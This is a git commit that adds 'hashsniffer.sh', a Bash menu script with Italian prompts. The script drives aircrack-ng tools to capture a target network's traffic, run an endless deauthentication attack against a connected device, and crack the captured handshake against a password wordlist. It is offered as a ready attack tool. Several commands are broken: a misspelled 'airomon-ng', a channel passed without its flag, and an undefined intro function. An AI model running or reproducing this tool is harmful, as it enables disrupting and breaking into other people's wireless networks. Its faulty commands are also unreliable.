a4589288108154f44227431baf68b09b3108c8db
noway <daviddavide847@gmail.com>
2024-05-04 19:50:06 +0200

    Create hashsniffer.sh

---
+++ hashsniffer.sh
@@ -0,0 +1,65 @@
+#!/bin/bash
+
+print_menu() {
+    echo "Seleziona un'opzione:"
+    echo "  1. Visualizza le schede di rete"
+    echo "  2. Seleziona scheda di rete"
+    echo "  3. Visualizza le reti disponibili"
+    echo "  4. Inizia listening su una rete"
+    echo "  5. Attacco Deauth"
+    echo "  6. Crack Password"
+    echo "  7. Installa Aircrack-ng"
+    echo "  8. Esci"
+}
+
+execute_command() {
+    case $1 in
+        1)
+            iwconfig
+            ;;
+        2)
+            read -p "Inserisci il nome dell'estensione wireless: " wireless_extension
+            sudo airomon-ng start $wireless_extension
+            ;;
+        3)
+            read -p "Inserisci il nome dell'estensione wireless: " wireless_extension
+            sudo airodump-ng "${wireless_extension}mon"
+            ;;
+        4)
+            read -p "Inserisci il canale: " channel
+            read -p "Inserisci il nome del file: " file_name
+            read -p "Inserisci il BSSID: " bssid
+            read -p "il nome dell'estensione wireless: " wireless_extension
+            sudo airodump-ng $channel -w $file_name -d $bssid "${wireless_extension}mon"
+            ;;
+        5)
+            read -p "Inserisci il BSSID: " bssid
+            read -p "Inserisci il MAC della stazione: " station
+            read -p "il nome dell'estensione wireless: " wireless_extension
+            sudo aireplay-ng --deauth 0 -a $bssid -c $station "${wireless_extension}mon"
+            ;;
+        6)
+            read -p "Inserisci il nome del file .cap: " cap_file
+            read -p "Inserisci il nome del file di password: " password_file
+            sudo aircrack-ng $cap_file -w $password_file
+            ;;
+        7)
+            sudo apt install aircrack-ng
+            ;;
+        8)
+            exit 0
+            ;;
+        *)
+            echo "Opzione non valida!"
+            ;;
+    esac
+}
+
+while true; do
+    clear
+    intro_animation
+    clear
+    print_menu
+    read -p "Scelta: " choice
+    execute_command $choice
+done
